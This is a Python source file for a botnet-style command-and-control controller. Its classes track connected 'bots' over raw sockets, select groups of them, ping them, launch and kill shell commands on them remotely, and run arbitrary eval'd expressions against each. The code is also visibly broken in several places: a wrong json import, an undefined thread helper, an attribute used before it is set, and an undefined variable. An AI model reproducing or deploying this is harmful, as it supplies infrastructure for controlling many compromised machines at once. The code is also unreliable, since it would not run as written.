import socket
import orjson
import threading
import time
import logger
import random,string


class CommandBuffer:
    def __init__(self,channel,cmd,*args,shell=False):
        self.cmd = cmd,
        self.args = args
        self.shell = shell
        self.channel = channel
        self.channel.send(action="cmd_create",cmd=cmd,args=args,shell=shell)
        id = self.channel.wait_for("cmd_create_return",timeout=2)
        if id:
            id=id["id"]
        self.id=id
        self.channel.log.info("Command with id %s created" % self.id)
    @property
    def exist(self):
        self.channel.send(action="cmd_exists",id=self.id)
        d = self.channel.wait_for("cmd_exists_return",timeout=2)
        if d :
            return d["result"]

    def start(self):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_start",id=self.id)
        self.channel.log.info("Command with id %s started" % self.id)
    def stop(self):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_stop",id=self.id)
        self.channel.log.info("Command with id %s stopped" % self.id)
    def kill(self):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_kill",id=self.id)
        self.channel.log.info("Command with id %s killed" % self.id)
    @property
    def returncode(self):
        self.channel.send(action="cmd_returncode",id=self.id)
        d =self.channel.wait_for("cmd_returncode_return",timeout=2)
        if d:
            return d["code"]
    @property
    def pid(self):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_pid",id=self.id)
        d =self.channel.wait_for("cmd_pid_return",timeout=2)
        if d:return d["pid"]
    @property
    def isalive(self):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_isalive",id=self.id)
        d= self.channel.wait_for("cmd_isalive_return",timeout=2)
        if d:return d["result"]
    def write(self,id,thing):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_write",id=self.id,data=thing)
    def read(self,length=None):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_read",id=self.id,length=length)
        d= self.channel.wait_for("cmd_read_err_return",timeout=2)
        if d:return d["result"]
    def read_err(self,length=None):
        eg = self.exist
        if not eg:return
        self.channel.send(action="cmd_read_err",id=id,length=length)
        d= self.channel.wait_for("cmd_read_errreturn",timeout=2)
        if d:return d["result"]
    

SEP = b"{}"

class Bot:
    def __init__(self,sock,name,addr,group=None):
        self.name=name
        self.socket=sock
        self.id=self.channel.id
        if group:
            self.group = group
            self.group.add_bot(self)
        else:
            self.group = None
    def __getattribute__(self,attr):
        if attr in object.__getattribute__(self,"__dict__"):
            return object.__getattribute__(self,"__dict__")[attr]
        return getattr(object.__getattribute__(self,"channel"),attr)

class Channel:
    def __init__(self,sock,addr,id=None,group=None,muted=False,name=""):
        self.ip=addr[0]
        self.port=addr[1]
        self.id=id if id else "".join(random.choices(string.digits,k=4))
        self.sock=sock
        self.group=group
        self._name = name
        self.log = logger.Logger(f"[Bot-{self.id}] [{self.ip}:{self.port}] {self._name}")
        self.muted = muted
        self._actions = {}
        self._recv_queue = []
        self.triggers = {}
        self.block_tick = threading.Lock()
        self.sock.setblocking(0)
    
    def trigger(self,event,timeout=1.5):
        def _wwwwwwww(timeout,e_id):
            time.sleep(timeout)
            del self.triggers[e_id]
        e_id = str(random.randint(0,100))
        self.triggers[e_id] = event
        start_new_thread(_wwwwwwww,(timeout,e_id))
        return e_id
    
    def wait_for(self,action,timeout=1):
        t1 = time.time()
        while time.time() - t1 < timeout:
            for id,event in self.triggers.copy().items():
                if event["action"] == action:
                    return self._get_action(action,id)
        return None
    
    def tick(self):
        if self.block_tick.locked():return
        try:
            data = self.recv()
            self._recv_queue.append(data)
        except BlockingIOError:
            pass
        if self._recv_queue:print(self._recv_queue)
        self.handle()
        time.sleep(0.1)
    
    def handle(self):
        try:
            d = self._recv_queue.pop()
        except:
            return
        
        id = self.trigger(d)
        self._actions[d["action"] + id] = d
        return str(id)
    
    @property
    def name(self):
        return self._name
    
    @name.setter
    def name(self, name):
        self._name=name
        self.log.master = f"[Bot-{self.id}] [{self.ip}:{self.port}] {self._name}"
        self.set_value("name",name)
    
    def set_value(self,key,value):
        self.send(action="values_set",key=key,value=value)
    def get_value(self,key):
        self.send(action="values_get",key=key)
        return self.wait_for("values_get_return")["value"]
    def delete_value(self,key):
        self.send(action="values_delete",key=key)
    def list_value(self):
        self.send(action="values_list")
        return self.wait_for("values_list_return")["value"]
    
    def _get_action(self,type,id):
        return self._actions[type+id]
    
    def ping(self):
        with self.block_tick:
            self.sock.setblocking(1)
            self.sock.settimeout(3)
            t1= time.time()        
            try:
                self.send(action="ping")
                res = self.recv()
                self.log.debug(res.values())
            except BrokenPipeError:
                return -1
            except socket.timeout:
                print("timeout")
                return -2
            t2= time.time()
            time_elapsed= t2-t1
            self.sock.setblocking(0)
        return time_elapsed
    
    def execute(self,cmd,*args,shell=False):
        """execute(cmd,*args,shell=False):
               create a command, start it and return it's id.
               shell: should add /bin/sh at the start of the command.
        """
        cmd = CommandBuffer(self,cmd,*args,shell)
        return cmd
    
    def send(self,**kwargs):
        self.raw_send(json.dumps(kwargs).encode())
    def raw_send(self,data):
        if self.group.debug:self.log.debug("TX: ",data)
        self.sock.sendall(str(len(data)).encode()+SEP+data+SEP)
        
    def recv(self):
        return json.loads(self.raw_recv().decode())
    def _raw_recv_until_sep(self):
        datas = b""
        while not datas.endswith(SEP):
            datas += self.sock.recv(1)
        return datas[:-1]
        
    def raw_recv(self):
        length = int(self._raw_recv_until_sep())
        datas = self.sock.recv(length + 1)
        if self.group.debug:self.log.debug("RX: " + str(datas[:-1]))
        return datas[:-1]
    
    def close(self):
        try:
            self.send(action="exit")
        except:
            pass
        self.sock.close()
        if not self.muted:self.log.info("connection closed.")

class BotGroup:
    def __init__(self,name):
        self.name=name
        self.logger = logger.Logger(name)
        self.actives_bots = {}
        self.bots = {}
        self.selecteds_bots = {}
        self.bots_details = {}
        self.muted = False
        self.debug = False
        self._ping_result = {}
        
    def _ping_a_bot(self,bot):
        self._ping_result[bot] = bot.ping()
    
    def mute(self):
        self.muted = True
        self.logger.info("Bot group Muted.")
    def demute(self):
        self.muted = False
        self.logger.info("Bot group Unmuted.")
        
    def add_bot(self,bot):
        if not self.muted:self.logger.info("added bot "+bot.name+f" ({bot.id})")
        self.bots[bot.id] = bot
        self.bots_details[bot.id] = {}
        return bot.id
    
    def remove_bot(self,id):
        if not self.muted:self.logger.info("removed bot "+self.bots[id].name+f" ({id})")
        del self.bots[id]
        

    def select(self,*,id=None,slice=None,amount=None):
        bots = []
        if id is not None:
            bots.extend([self.bots[id]])
        if slice is not None:
            bots.extend([self.bots[i] for i in list(self.bots.keys())[slice]])
        if amount is not None:
            bots.extend([self.bots[i] for i in list(self.bots.keys())[0:amount if amount != "all" else len(self.bots)]])
        self.selecteds_bots = bots
        if not self.muted:self.logger.info(f"{len(self.selecteds_bots)} bots are selected.")

    def deselect(self):
        self.selecteds_bots = []
        if not self.muted:self.logger.info(f"{len(self.selecteds_bots)} bots are now deselected.")

    
    def ping(self):
        if not self.muted:self.logger.info(f"Pinging {len(self.selecteds_bots)} selecteds bots ...")
        threads = []
        for i in self.selecteds_bots:
            threads.append(threading.Thread(target=self._ping_a_bot,args=(i,)))
        
        for i in threads:
            i.start()
            i.join()
        
        times = {}
        for bot,v in self._ping_result.items():
            times[bot.id] = v
            if v == -1:
                self.logger.warning(f"Connection lost with Bot-{bot.id} ({bot.name})")
                self.selecteds_bots.remove(bot)
                if self.debug:
                    self.logger.debug(f"Bot-{bot.id} ({bot.name}) de-selected.")
            elif v == -2:
                self.logger.warning(f"Unable to retreive a response with Bot-{bot.id} ({bot.name}). It may not have a good connection.")
                self.selecteds_bots.remove(bot)
                if self.debug:
                    self.logger.debug(f"Bot-{bot.id} ({bot.name}) de-selected.")
            else:
                self.bots_details[bot.id]["last_ping_time"] = v
                
        if not self.muted:self.logger.info(f"{len(self.selecteds_bots)} bots where pinged.")    
    def execute(self,command,*args,**kwargs):
        if not self.muted:self.logger.info(f"Atteming to execute \"{command}\" ...")
        not_respond = []
        for i in self.selecteds_bots:
            buffer = i.execute(command,*args)
            if not buffer.id:
                not_respond.append(i)
            if self.debug:
                if buffer.id:
                    if not self.muted:self.logger.info(f"Command executed for Bot-{bot.id} ({bot.name})")
                else:
                    self.logger.warning(f"Bot-{bot.id} ({bot.name}) didn't respond.")
            self.bots_details[i.id]["last_command_buffer"] = buffer
            self.bots_details[i.id]["last_command_executed"] = command + str(args)
            
        if not self.muted:self.logger.info(f"Command executed on {len(self.selecteds_bots)} bots, and {len(not_respond)} bots didn't responded.")

    def control(self,cmd):
        if not self.muted:self.logger.info(f"Atteming to control {len(self.selecteds_bots)} selecteds bots ...")
        for i in self.selecteds_bots:
            try:
                i.result = eval(cmd,{"bot":i})
                if i.result:
                    print(f"Bot-{i.id} ({i.name}): "+str(i.result))
            #except Exception as e:
            #    print(f"Bot-{i.id} ({i.name}): ",e.__class__.__name__,":",e)
            finally:
                pass
    def details(self):
        self.logger.info(f"Here is the details for {len(self.selecteds_bots)} selecteds bots:")
        for i,v in self.bots_details.items():
            print("Bot-"+str(i)+":")
            for i,v in v.items():
                print("\t"+i.replace("_"," ").capitalize()+" :   "+str(v))
                
    def stop(self):
        for bot in self.selecteds_bots:
            bot.stop()
            del self.actives_bots[bot.id]
        self.logger.info(f"Stopped {len(self.selecteds_bots)} bots.")

    def mute_bots(self):
        for bot in self.selecteds_bots:
            bot.mute()
        if not self.muted:self.logger.info(f"Mutted {len(self.selecteds_bots)} bots.")
            
    def unmute_bots(self):
        for bot in self.selecteds_bots:
            bot.unmute()
        if not self.muted:self.logger.info(f"Demuted {len(self.selecteds_bots)} bots.")

    def active(self):
        return {"total":len(self.bots),"running":len(self.actives_bots),"remaining":len(self.bots)-len(self.actives_bots),"selecteds":len(self.selecteds_bots)}

if __name__ == "__main__":
    bg = BotGroup("Botgroup")
    for _ in range(30):
        _ = Bot(socket.socket(),"".join(random.choices(string.ascii_lowercase,k=5)),("localhost,",8000),bg)